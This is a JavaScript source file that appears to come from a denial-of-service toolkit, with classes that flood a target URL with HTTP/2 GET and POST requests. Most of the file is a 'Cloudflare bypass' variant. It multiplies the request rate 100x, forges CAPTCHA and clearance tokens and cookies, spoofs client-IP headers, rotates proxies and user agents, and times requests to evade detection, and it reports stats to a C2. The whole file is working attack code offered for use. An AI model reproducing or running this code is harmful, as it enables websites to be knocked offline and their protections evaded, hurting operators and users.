import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';
import { proxyRotator } from '../../utils/proxy-rotator.js';
import { globalIPRotator } from '../../utils/ip-rotator.js';
import { globalUserAgentRotator } from '../../utils/user-agent-rotator.js';

/**
 * HTTP/2 Flood Attack
 */
export class HTTP2Flood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Stats tracking for C2
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            totalBytes: 0,
            totalPackets: 0
        };
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const headers = {
            ':method': 'GET',
            ':path': this.url.pathname + this.url.search,
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.host,
            'user-agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'max-age=0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false,
                maxSessionMemory: 100
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const req = client.request(this.generateHeaders());
                    this.stats.totalRequests++;

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                        this.stats.successfulRequests++;
                        this.stats.totalPackets++;
                    });

                    req.on('data', (chunk) => {
                        this.stats.totalBytes += chunk.length;
                    });
                    
                    req.on('end', () => {});
                    
                    req.on('error', () => {
                        this.stats.failedRequests++;
                    });

                    req.end();
                    BYTES_SENT.add(200); // Approximate header size
                    this.stats.totalBytes += 200;
                } catch (e) {
                    this.stats.failedRequests++;
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 50); // Reduced from 1000ms to 50ms for 20x speed!
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/2 POST Flood Attack
 */
export class HTTP2PostFlood extends HTTP2Flood {
    generateHeaders() {
        const headers = super.generateHeaders();
        headers[':method'] = 'POST';
        headers['content-type'] = 'application/json';
        return headers;
    }

    generatePayload() {
        return JSON.stringify({
            data: Tools.randomString(512)
        });
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const payload = this.generatePayload();

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const headers = this.generateHeaders();
                    headers['content-length'] = Buffer.byteLength(payload);

                    const req = client.request(headers);

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.write(payload);
                    req.end();
                    
                    BYTES_SENT.add(Buffer.byteLength(payload) + 200);
                } catch (e) {
                    // Silent fail
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 1000);
        });
    }
}

/**
 * HTTP/2 Cloudflare Bypass - IMPROVED AGGRESSIVE VERSION
 */
export class HTTP2CFBypass extends HTTP2Flood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        super(targetUrl, duration, rpc * 100, userAgents, referers, proxies); // 100x multiplier!
        this.cookies = new Map();
        
        // Pre-generate realistic cookies
        this.cookies.set('cf_clearance', Tools.randomString(40) + '-' + Date.now());
        this.cookies.set('__cf_bm', Tools.randomString(64));
        this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
        this.cookies.set('__cfruid', Tools.randomString(32));
        this.cookies.set('cf_ob_info', Tools.randomString(16));
        this.cookies.set('_ga', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
        this.cookies.set('_gid', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
        
        // Pre-generate bypass tokens (MORE TOKENS!)
        this.bypassTokens = {
            turnstile: this.generateTurnstileTokens(200),
            cfClearance: this.generateCfClearanceTokens(100),
            jsChallenge: this.generateJsChallengeTokens(80),
            sessionTokens: this.generateSessionTokens(50),
            fingerprints: this.generateBrowserFingerprints(30)
        };
        
        // Initialize rotation systems
        this.proxyRotator = proxyRotator;
        this.ipRotator = globalIPRotator;
        this.uaRotator = globalUserAgentRotator;
        
        logger.info('🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized');
        logger.info(`   RPC Multiplier: 100x (${this.rpc} requests per batch)`);
        logger.info(`   Generated ${this.bypassTokens.turnstile.length + this.bypassTokens.cfClearance.length + this.bypassTokens.jsChallenge.length} bypass tokens`);
        logger.info(`   Proxy Pool: ${this.proxyRotator.getStats().total} proxies`);
        logger.info(`   IP Pool: ${this.ipRotator.getStats().totalIPs} IPs`);
        logger.info(`   UA Pool: ${this.uaRotator.getStats().total} user agents`);
    }

    generateTurnstileTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            const part1 = Tools.randomString(64);
            const part2 = Tools.randomString(32);
            const part3 = Tools.randomString(64);
            tokens.push(`0.${part1}.${part2}.${part3}`);
        }
        return tokens;
    }

    generateCfClearanceTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            const randomPart = Tools.randomString(32);
            const timestamp = Date.now() + Tools.randomInt(-86400000, 86400000);
            tokens.push(`${randomPart}-${timestamp}`);
        }
        return tokens;
    }

    generateJsChallengeTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push(Tools.randomString(32));
        }
        return tokens;
    }

    generateSessionTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push({
                sessionId: Tools.randomString(32),
                csrfToken: Tools.randomString(40),
                xsrfToken: Tools.randomString(32),
                apiKey: Tools.randomString(64)
            });
        }
        return tokens;
    }

    generateBrowserFingerprints(count) {
        const fingerprints = [];
        const browsers = [
            { name: 'Chrome', version: '120.0.6099.130', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' },
            { name: 'Firefox', version: '121.0', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0' },
            { name: 'Safari', version: '17.2', ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' },
            { name: 'Edge', version: '120.0.2210.91', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91' }
        ];
        
        for (let i = 0; i < count; i++) {
            const browser = Tools.randomChoice(browsers);
            fingerprints.push({
                userAgent: browser.ua,
                acceptLanguage: Tools.randomChoice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9']),
                acceptEncoding: 'gzip, deflate, br',
                viewport: Tools.randomChoice(['1920x1080', '1366x768', '1536x864', '1440x900']),
                timezone: Tools.randomChoice(['America/New_York', 'Europe/London', 'Asia/Tokyo']),
                platform: Tools.randomChoice(['Win32', 'MacIntel', 'Linux x86_64'])
            });
        }
        return fingerprints;
    }

    generateHeaders() {
        try {
            const headers = super.generateHeaders();
            
            // Get random bypass tokens with null checks
        const turnstileToken = this.bypassTokens.turnstile && this.bypassTokens.turnstile.length > 0 
            ? Tools.randomChoice(this.bypassTokens.turnstile) 
            : `0.${Tools.randomString(64)}.${Tools.randomString(32)}.${Tools.randomString(64)}`;
        
        const cfClearance = this.bypassTokens.cfClearance && this.bypassTokens.cfClearance.length > 0
            ? Tools.randomChoice(this.bypassTokens.cfClearance)
            : `${Tools.randomString(32)}-${Date.now()}`;
            
        const jsChallenge = this.bypassTokens.jsChallenge && this.bypassTokens.jsChallenge.length > 0
            ? Tools.randomChoice(this.bypassTokens.jsChallenge)
            : Tools.randomString(32);
            
        const sessionToken = this.bypassTokens.sessionTokens && this.bypassTokens.sessionTokens.length > 0
            ? Tools.randomChoice(this.bypassTokens.sessionTokens)
            : {
                sessionId: Tools.randomString(32),
                csrfToken: Tools.randomString(40),
                xsrfToken: Tools.randomString(32),
                apiKey: Tools.randomString(64)
            };
            
        const fingerprint = this.bypassTokens.fingerprints && this.bypassTokens.fingerprints.length > 0
            ? Tools.randomChoice(this.bypassTokens.fingerprints)
            : {
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                acceptLanguage: 'en-US,en;q=0.9',
                acceptEncoding: 'gzip, deflate, br'
            };
        
        // CAPTCHA bypass headers (multiple formats)
        headers['cf-turnstile-response'] = turnstileToken;
        headers['g-recaptcha-response'] = turnstileToken;
        headers['h-captcha-response'] = turnstileToken;
        headers['turnstile-token'] = turnstileToken;
        headers['x-turnstile-token'] = turnstileToken;
        
        // JS Challenge bypass
        headers['cf-challenge-response'] = jsChallenge;
        headers['x-cf-challenge'] = jsChallenge;
        headers['cf-challenge-token'] = jsChallenge;
        
        // Session persistence headers
        headers['x-session-id'] = sessionToken.sessionId;
        headers['x-csrf-token'] = sessionToken.csrfToken;
        headers['x-xsrf-token'] = sessionToken.xsrfToken;
        headers['x-api-key'] = sessionToken.apiKey;
        headers['x-request-id'] = Tools.randomString(32);
        
        // Use rotated user agent with null check
        const rotatedUA = this.uaRotator && this.uaRotator.getNextUserAgent 
            ? this.uaRotator.getNextUserAgent()
            : fingerprint.userAgent;
            
        headers['user-agent'] = rotatedUA;
        headers['accept-language'] = fingerprint.acceptLanguage;
        headers['accept-encoding'] = fingerprint.acceptEncoding;
        
        // Add compatible headers for the rotated UA with null check
        if (this.uaRotator && this.uaRotator.getCompatibleHeaders) {
            const compatibleHeaders = this.uaRotator.getCompatibleHeaders(rotatedUA);
            Object.assign(headers, compatibleHeaders);
        }
        
        // Advanced Cloudflare bypass headers with IP rotation (null checks)
        if (this.ipRotator && this.ipRotator.getRotationHeaders) {
            const rotationHeaders = this.ipRotator.getRotationHeaders();
            Object.assign(headers, rotationHeaders);
        }
        
        headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA']);
        headers['cf-connecting-ip'] = this.ipRotator && this.ipRotator.getNextIP 
            ? this.ipRotator.getNextIP() 
            : Tools.randomIPv4();
        headers['cf-ipcountry'] = this.ipRotator && this.ipRotator.getRandomCountry
            ? this.ipRotator.getRandomCountry()
            : Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']);
        headers['cf-visitor'] = '{"scheme":"https"}';
        headers['cf-request-id'] = Tools.randomString(32);
        headers['cdn-loop'] = 'cloudflare';
        headers['x-forwarded-proto'] = 'https';
        headers['x-forwarded-host'] = this.url.hostname;
        
        // Modern browser fingerprinting headers
        headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        headers['sec-ch-ua-mobile'] = '?0';
        headers['sec-ch-ua-platform'] = Tools.randomChoice(['"Windows"', '"macOS"', '"Linux"']);
        headers['sec-ch-ua-arch'] = Tools.randomChoice(['"x86"', '"arm"', '"x64"']);
        headers['sec-ch-ua-bitness'] = Tools.randomChoice(['"64"', '"32"']);
        headers['sec-ch-ua-model'] = '""';
        headers['sec-ch-ua-platform-version'] = Tools.randomChoice(['"15.0.0"', '"12.7.0"', '"6.5.0"']);
        headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"';
        
        // Additional security headers
        headers['sec-fetch-dest'] = 'document';
        headers['sec-fetch-mode'] = 'navigate';
        headers['sec-fetch-site'] = Tools.randomChoice(['none', 'same-origin', 'cross-site', 'same-site']);
        headers['sec-fetch-user'] = '?1';
        headers['upgrade-insecure-requests'] = '1';
        headers['dnt'] = '1';
        
        // Browser fingerprint spoofing
        headers['x-requested-with'] = 'XMLHttpRequest';
        headers['origin'] = this.url.origin;
        headers['referer'] = this.url.href;
        headers['x-csrf-token'] = Tools.randomString(32);
        
        // Update cookies with new cf_clearance + session persistence
        this.cookies.set('cf_clearance', cfClearance);
        this.cookies.set('__cf_bm', Tools.randomString(43));
        this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
        this.cookies.set('session_id', sessionToken.sessionId);
        this.cookies.set('csrf_token', sessionToken.csrfToken);
        this.cookies.set('_session', Tools.randomString(64));
        this.cookies.set('_token', Tools.randomString(40));
        
        // Add browser-specific cookies
        if (fingerprint.userAgent.includes('Chrome')) {
            this.cookies.set('_gcl_au', Tools.randomString(32));
            this.cookies.set('_gat', '1');
        } else if (fingerprint.userAgent.includes('Firefox')) {
            this.cookies.set('_pk_id', Tools.randomString(32));
        }
        
        // Add realistic cookies
        const cookieString = Array.from(this.cookies.entries())
            .map(([k, v]) => `${k}=${v}`)
            .join('; ');
        headers['cookie'] = cookieString;
        
        // Add cache busting with multiple parameters
        const cacheBuster = `?_cb=${Date.now()}_${Tools.randomString(8)}&bypass=${Math.random()}&fp=${Tools.randomString(6)}`;
        headers[':path'] = headers[':path'] + cacheBuster;
        
        // Human behavior simulation headers
        if (Math.random() > 0.6) {
            headers['x-requested-with'] = 'XMLHttpRequest';
        }
        
        if (Math.random() > 0.7) {
            headers['x-api-key'] = Tools.randomString(32);
        }
        
        if (Math.random() > 0.8) {
            headers['authorization'] = `Bearer ${Tools.randomString(64)}`;
        }
        
        // Simulate different request types
        const requestType = Tools.randomChoice(['page', 'ajax', 'api', 'asset']);
        switch (requestType) {
            case 'ajax':
                headers['x-requested-with'] = 'XMLHttpRequest';
                headers['content-type'] = 'application/json';
                break;
            case 'api':
                headers['accept'] = 'application/json, text/plain, */*';
                headers['content-type'] = 'application/json';
                break;
            case 'asset':
                headers['accept'] = 'image/webp,image/apng,image/*,*/*;q=0.8';
                headers['sec-fetch-dest'] = 'image';
                break;
            default: // page
                headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
                headers['sec-fetch-dest'] = 'document';
        }
        
        return headers;
        
        } catch (error) {
            logger.debug(`❌ generateHeaders error: ${error.message}`);
            // Return basic headers as fallback
            return {
                ':method': 'GET',
                ':scheme': this.url.protocol.replace(':', ''),
                ':authority': this.url.hostname,
                ':path': this.url.pathname + this.url.search,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            };
        }
    }

    async attack() {
        return new Promise((resolve) => {
            // Get rotated proxy with null check
            const proxy = this.proxyRotator && this.proxyRotator.getNextProxy 
                ? this.proxyRotator.getNextProxy() 
                : null;
            
            // Anti-detection: Random connection settings
            const connectionSettings = {
                rejectUnauthorized: false,
                ALPNProtocols: ['h2', 'http/1.1'],
                settings: {
                    headerTableSize: Tools.randomChoice([4096, 8192, 16384, 32768, 65536]),
                    enablePush: Tools.randomChoice([true, false]),
                    initialWindowSize: Tools.randomChoice([65535, 131072, 262144, 1048576, 6291456]),
                    maxFrameSize: Tools.randomChoice([16384, 32768, 65536]),
                    maxConcurrentStreams: Tools.randomChoice([100, 250, 500, 1000]),
                    maxHeaderListSize: Tools.randomChoice([8192, 16384, 65536, 262144])
                }
            };
            
            // Add proxy if available with null checks
            if (proxy && this.proxyRotator && this.proxyRotator.getProxyConfig) {
                try {
                    const proxyConfig = this.proxyRotator.getProxyConfig(proxy);
                    if (proxyConfig && proxyConfig.host && proxyConfig.port) {
                        connectionSettings.agent = new (require('https').Agent)({
                            proxy: `http://${proxyConfig.host}:${proxyConfig.port}`
                        });
                        logger.debug(`🔄 Using proxy: ${proxy}`);
                    }
                } catch (err) {
                    logger.debug(`❌ Proxy config error: ${err.message}`);
                }
            }
            
            const client = http2.connect(this.url.origin, connectionSettings);

            client.on('error', () => {
                client.close();
                resolve();
            });

            let requestsSent = 0;
            const totalRequests = this.rpc;
            
            // Anti-detection: More sophisticated timing patterns
            const requestIntervals = [0, 5, 10, 15, 25, 35, 50, 75, 100, 125, 150, 200, 250, 300]; // ms
            let currentInterval = 0;
            let burstCount = 0;
            const maxBurst = Tools.randomChoice([5, 8, 12, 15]); // Random burst size

            const makeRequest = () => {
                if (!this.active || requestsSent >= totalRequests) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    // Anti-detection: Random HTTP/2 stream settings
                    const streamSettings = {
                        weight: Tools.randomChoice([16, 32, 64, 128, 256]),
                        exclusive: Tools.randomChoice([true, false]),
                        parent: Tools.randomChoice([0, 1, 3, 5])
                    };
                    
                    const req = client.request(this.generateHeaders(), streamSettings);

                    req.on('response', (responseHeaders) => {
                        REQUESTS_SENT.add(1);
                        
                        // Extract and save cookies from response
                        if (responseHeaders['set-cookie']) {
                            const cookies = Array.isArray(responseHeaders['set-cookie']) 
                                ? responseHeaders['set-cookie'] 
                                : [responseHeaders['set-cookie']];
                            
                            cookies.forEach(cookie => {
                                const [nameValue] = cookie.split(';');
                                const [name, value] = nameValue.split('=');
                                if (name && value) {
                                    this.cookies.set(name.trim(), value.trim());
                                }
                            });
                        }
                    });

                    req.on('data', (chunk) => {
                        BYTES_SENT.add(chunk.length);
                    });
                    
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.end();
                    BYTES_SENT.add(500); // Accounting for headers
                    requestsSent++;
                    burstCount++;
                    
                    // Anti-detection: Sophisticated burst + delay pattern
                    let delay = 0;
                    
                    if (burstCount >= maxBurst) {
                        // After burst, take longer break
                        delay = Tools.randomChoice([300, 500, 750, 1000, 1500]);
                        burstCount = 0;
                    } else {
                        // Within burst, use shorter intervals
                        delay = requestIntervals[currentInterval % requestIntervals.length];
                        currentInterval++;
                    }
                    
                    if (delay > 0) {
                        setTimeout(makeRequest, delay);
                    } else {
                        setImmediate(makeRequest);
                    }
                } catch (e) {
                    // Silent fail and continue with random delay
                    const retryDelay = Tools.randomChoice([0, 5, 10, 25]);
                    setTimeout(makeRequest, retryDelay);
                }
            };

            // Anti-detection: Start requests in waves instead of all at once
            const startWaves = () => {
                const waveSize = Tools.randomChoice([3, 5, 8, 12, 15]);
                for (let i = 0; i < waveSize; i++) {
                    setTimeout(() => makeRequest(), i * Tools.randomChoice([0, 5, 10, 15]));
                }
            };
            
            // Start multiple waves with delays
            startWaves();
            setTimeout(startWaves, 200);
            setTimeout(startWaves, 500);
            setTimeout(startWaves, 800);

            setTimeout(() => {
                client.close();
                resolve();
            }, 3000); // Longer timeout for more requests
        });
    }
}
